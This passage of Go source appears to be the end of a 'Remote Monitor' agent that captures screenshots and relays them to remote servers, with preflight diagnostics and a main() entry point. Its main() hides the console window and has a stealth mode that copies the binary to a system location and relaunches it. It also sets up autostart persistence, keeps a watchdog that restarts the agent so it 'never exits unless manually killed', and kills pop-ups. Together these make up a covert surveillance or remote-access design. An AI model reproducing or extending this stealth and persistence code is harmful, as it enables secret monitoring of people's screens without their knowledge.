				if strings.HasPrefix(s, "192.168.") || strings.HasPrefix(s, "10.") || (len(ip) >= 2 && ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31) {
					return s
				}
			}
		}
	}
	return ""
}

func loadAgentID() {
	p := filepath.Join(dataDir(), "agent.id")
	data, _ := os.ReadFile(p)
	if len(data) > 0 {
		agentID = string(data)
		return
	}
	h, _ := os.Hostname()
	agentID = h + "-" + fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	os.WriteFile(p, []byte(agentID), 0644)
	hostname = h
}

func executeControl(cmd string, params map[string]string) {
	llog("info", "control: %s %v", cmd, params)
}

// ============================================================================
// SECTION 27 — Preflight Check
// ============================================================================

type PreflightResult struct {
	Name    string `json:"name"`
	Status  string `json:"status"` // pass / warn / fail
	Message string `json:"message"`
}

func preflightCheck(cfg *Config) []PreflightResult {
	var results []PreflightResult

	// 1. Display capture
	displays := screenshot.NumActiveDisplays()
	if displays > 0 {
		bounds := screenshot.GetDisplayBounds(0)
		results = append(results, PreflightResult{
			Name: "display", Status: "pass",
			Message: fmt.Sprintf("%d display(s), primary %dx%d", displays, bounds.Dx(), bounds.Dy()),
		})
		// Quick test capture
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			results = append(results, PreflightResult{
				Name: "capture-test", Status: "warn",
				Message: fmt.Sprintf("capture failed: %v", err),
			})
		} else {
			results = append(results, PreflightResult{
				Name: "capture-test", Status: "pass",
				Message: fmt.Sprintf("captured %dx%d pixel frame", img.Bounds().Dx(), img.Bounds().Dy()),
			})
		}
	} else {
		results = append(results, PreflightResult{
			Name: "display", Status: "fail",
			Message: "no active displays found",
		})
	}

	// 2. Data directory
	dd := dataDir()
	if err := os.MkdirAll(dd, 0755); err != nil {
		results = append(results, PreflightResult{
			Name: "data-dir", Status: "fail",
			Message: fmt.Sprintf("cannot create %s: %v", dd, err),
		})
	} else {
		results = append(results, PreflightResult{
			Name: "data-dir", Status: "pass",
			Message: dd,
		})
	}

	// 3. Agent ID
	aidPath := filepath.Join(dd, "agent.id")
	if _, err := os.Stat(aidPath); err == nil {
		results = append(results, PreflightResult{
			Name: "agent-id", Status: "pass",
			Message: aidPath,
		})
	} else {
		results = append(results, PreflightResult{
			Name: "agent-id", Status: "pass",
			Message: "will be created on first run",
		})
	}

	// 4. Config
	if len(cfg.ServerURLs) == 0 {
		results = append(results, PreflightResult{
			Name: "server-urls", Status: "warn",
			Message: "no server URLs configured",
		})
	} else {
		results = append(results, PreflightResult{
			Name: "server-urls", Status: "pass",
			Message: fmt.Sprintf("%d URL(s): %v", len(cfg.ServerURLs), cfg.ServerURLs),
		})
	}

	// 5. Network (DNS + basic reachability for each server URL)
	for _, url := range cfg.ServerURLs {
		host := url
		if strings.HasPrefix(url, "ws://") {
			host = url[5:]
		} else if strings.HasPrefix(url, "wss://") {
			host = url[6:]
		}
		if idx := strings.Index(host, ":"); idx > 0 {
			host = host[:idx]
		}
		if idx := strings.Index(host, "/"); idx > 0 {
			host = host[:idx]
		}
		if host == "127.0.0.1" || host == "localhost" {
			results = append(results, PreflightResult{
				Name: "dns:" + host, Status: "pass",
				Message: "local address",
			})
			continue
		}
		addrs, err := net.LookupHost(host)
		if err != nil {
			results = append(results, PreflightResult{
				Name: "dns:" + host, Status: "fail",
				Message: fmt.Sprintf("DNS lookup failed: %v", err),
			})
		} else {
			results = append(results, PreflightResult{
				Name: "dns:" + host, Status: "pass",
				Message: fmt.Sprintf("resolved to %v", addrs),
			})
		}
	}

	// 6. Tunnel (built-in TCP forwarder always available)
	if cfg.TunnelMode != "" {
		results = append(results, PreflightResult{
			Name: "tunnel:builtin", Status: "pass",
			Message: "TCP forwarder built into .exe",
		})
	}

	// 7. Dashboard port availability
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", cfg.ConfigPort))
	if err != nil {
		results = append(results, PreflightResult{
			Name: "dashboard-port", Status: "warn",
			Message: fmt.Sprintf("port %d: %v (dashboard may fail)", cfg.ConfigPort, err),
		})
	} else {
		ln.Close()
		results = append(results, PreflightResult{
			Name: "dashboard-port", Status: "pass",
			Message: fmt.Sprintf("port %d available", cfg.ConfigPort),
		})
	}

	// 8. OS version
	results = append(results, PreflightResult{
		Name: "os-version",
		Status: "pass",
		Message: getOSVersion(),
	})

	return results
}

func printPreflight(results []PreflightResult) {
	pass, warn, fail := 0, 0, 0
	for _, r := range results {
		icon := map[string]string{"pass": "✓", "warn": "⚠", "fail": "✗"}[r.Status]
		llog("info", "  %s %s: %s", icon, r.Name, r.Message)
		switch r.Status {
		case "pass":
			pass++
		case "warn":
			warn++
		case "fail":
			fail++
		}
	}
	llog("info", "preflight: %d pass, %d warn, %d fail", pass, warn, fail)
}

// ============================================================================
// SECTION 28 — main()
// ============================================================================

var (
	agentID  string
	hostname string
)

func (a *Agent) pushEvent(typ, detail string) {
	if a.eventBuf != nil {
		a.eventBuf.Push(typ, detail)
	}
	if globalActivity != nil {
		globalActivity.Record(typ, detail)
	}
	if a.reportSink != nil {
		a.reportSink(a.id, []ActivityEvent{{
			Timestamp: time.Now().UnixMilli(),
			Type:      typ,
			Detail:    detail,
		}})
	}
}

func main() {
	var (
		serverMode = flag.Bool("server", false, "Run in server mode")
		lanMode    = flag.Bool("lan", false, "LAN-only mode")
		configFile = flag.String("config", "", "Config file path")
		runCheck   = flag.Bool("check", false, "Run preflight diagnostics and exit")
		help       = flag.Bool("help", false, "Show help")
		forceKill  = flag.Bool("force", false, "Kill existing instance before starting")
		port       = flag.Int("port", 0, "Dashboard/server port (default: 8181)")
	)
	flag.Parse()

	if *help {
		fmt.Printf("Remote Monitor v%s\n\n", Version)
		fmt.Println("Usage:")
		fmt.Println("  monitor               Run as agent")
		fmt.Println("  monitor --server      Run as relay server")
		fmt.Println("  monitor --lan         LAN-only mode")
		fmt.Println("  monitor --check       Run preflight diagnostics")
		fmt.Println("  monitor --force       Kill existing instance first")
		fmt.Println("  monitor --port=8182   Use different port (auto-detect if in use)")
		fmt.Println("\nFlags:")
		flag.PrintDefaults()
		fmt.Println("\nEnv:")
		fmt.Println("  PUN_SERVER_URL, PUN_SERVER_PORT, PUN_AUTH_USER, PUN_AUTH_PASS")
		fmt.Println("  PUN_MONTHLY_LIMIT_MB, PUN_TUNNEL, PUN_SERVER, PUN_SSH_DEST")
		fmt.Println("  PORT                 (auto: Render/Heroku PORT env)")
		os.Exit(0)
	}

	if *runCheck {
		hideConsole()
		cfg := LoadConfig()
		results := preflightCheck(cfg)
		fmt.Printf("\n╔══════════════════════════════════════╗\n")
		fmt.Printf("║  Remote Monitor v%s — Diagnostics ║\n", Version)
		fmt.Printf("╚══════════════════════════════════════╝\n\n")
		for _, r := range results {
			icon := map[string]string{"pass": "✓", "warn": "⚠", "fail": "✗"}[r.Status]
			fmt.Printf("  %s  %-20s %s\n", icon, r.Name, r.Message)
		}
		fmt.Println()
		os.Exit(0)
	}

	// Watchdog mode: run as separate watchdog process
	if os.Getenv("PUNMONITOR_WATCHDOG") == "1" {
		targetPID, _ := strconv.Atoi(os.Getenv("PUNMONITOR_TARGET_PID"))
		if targetPID > 0 {
			watchdogLoop(targetPID)
		}
		os.Exit(0)
	}

	hideConsole()

	if !ensureSingleInstance(*forceKill) {
		os.Exit(0)
	}
	defer func() {
		recordShutdown("process exit")
		releaseSingleton()
	}()

	loadAgentID()
	hostname, _ = os.Hostname()
	initActivityStore()
	cleanDuplicateAutostartEntries()

	// Agent mode: run forever until manually stopped (no signal cancellation)
	// Server mode: respect signals for graceful shutdown
	var ctx context.Context
	var cancel context.CancelFunc
	if *serverMode {
		ctx, cancel = signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	} else {
		ctx, cancel = context.WithCancel(context.Background())
	}
	defer cancel()

	cfg := LoadConfig()
	if *configFile != "" {
		if data, err := os.ReadFile(*configFile); err == nil {
			var fc Config
			if json.Unmarshal(data, &fc) == nil {
				if len(fc.ServerURLs) > 0 {
					cfg.ServerURLs = fc.ServerURLs
				}
				if fc.MonthlyLimitMB != 0 {
					cfg.MonthlyLimitMB = fc.MonthlyLimitMB
				}
			}
		}
	}
	if os.Getenv("RENDER") == "true" {
		*serverMode = true
		llog("info", "Render environment detected — enabling server mode")
	}
	cfg.IsServerMode = *serverMode
	cfg.IsLanMode = *lanMode
	if *port > 0 {
		cfg.ConfigPort = *port
	}
	if cfg.ConfigPort <= 0 {
		cfg.ConfigPort = defaultConfigPort
	}

	// Load URLs from urls.ini
	loadURLs(cfg)

	llog("info", "Starting v%s mode=%s agent=%s", Version, map[bool]string{false: "AGENT", true: "SERVER"}[*serverMode], agentID)
	llog("info", "budget=%d MB URLs=%v", cfg.MonthlyLimitMB, cfg.ServerURLs)

	// Preflight check
	llog("info", "--- preflight check ---")
	results := preflightCheck(cfg)
	printPreflight(results)
	// Count failures — warn but don't block
	var fails int
	for _, r := range results {
		if r.Status == "fail" {
			fails++
		}
	}
	if fails > 0 {
		llog("warn", "%d preflight check(s) failed — continuing anyway", fails)
	}
	llog("info", "--- preflight done ---")

	// Autostart / stealth
	if cfg.Autostart {
		setupAutostart()
	}
	if cfg.StealthMode {
		if dest, err := copyToSystemLocation(); err == nil && dest != "" {
			cmd := exec.Command(dest)
			cmd.Start()
			os.Exit(0)
		}
	}
	// Background workers (agent mode only)
	if !cfg.IsServerMode {
		startPopupKiller(ctx)
	}

	if cfg.IsServerMode {
		llog("info", "server port: %d", cfg.ConfigPort)
		if isPortInUse(cfg.ConfigPort) {
			llog("info", "port %d already in use — another PunMonitor server may be running; exiting", cfg.ConfigPort)
			os.Exit(0)
		}
		sm := NewServerMode(cfg)
		if err := sm.Start(ctx); err != nil {
			llog("error", "server: %v", err)
		}
		return
	}

	if isPortInUse(cfg.ConfigPort) {
		llog("warn", "port %d in use — local dashboard may conflict; only one instance should run", cfg.ConfigPort)
	}

	// LAN discovery
	if cfg.IsLanMode {
		discovery := NewLANDiscovery()
		discovery.SetAgentID(agentID)
		discovery.SetPort(cfg.ConfigPort)
		discovery.Start()
		defer discovery.Stop()
		time.Sleep(3 * time.Second)
		discovered := discovery.GetServers()
		if len(discovered) > 0 {
			llog("info", "LAN servers: %v", discovered)
			allURLs := append(discovered, cfg.GetServerURLs()...)
			cfg.SetServerURLs(allURLs)
		}
	}

	// Start local dashboard server (agent mode) — runs forever on same port
	frameCh := make(chan *WireMessage, 32)
	ds := NewDashboardServer(cfg, frameCh, nil, nil, nil)
	dashCtx, dashCancel := context.WithCancel(context.Background())
	defer dashCancel()
	go func() {
		if err := ds.Start(dashCtx); err != nil && dashCtx.Err() == nil {
			llog("error", "dashboard: %v", err)
		}
	}()

	// Agent with auto-restart watchdog — never exits unless manually killed
	for {
		agent := NewAgent(cfg, frameCh)
		agent.reportSink = ds.addReport
		ds.agent = agent
		ds.pool = agent.pool
		ds.bandwidth = agent.bandwidth
		agent.Start()
		// Start watchdog after agent is fully started (only once; subsequent loops no-op)
		startWatchdog()
		// Wait for agent to exit (crash recovery)
		<-agent.done
		agent.Shutdown()
		// If main context was cancelled, exit cleanly
		if ctx.Err() != nil {
			break
		}
		// Otherwise restart immediately on same port — no reset needed
		llog("info", "agent crashed — restarting immediately (PID preserved, port :%d unchanged)", cfg.ConfigPort)
		time.Sleep(1 * time.Second)
	}

	llog("info", "goodbye")
}











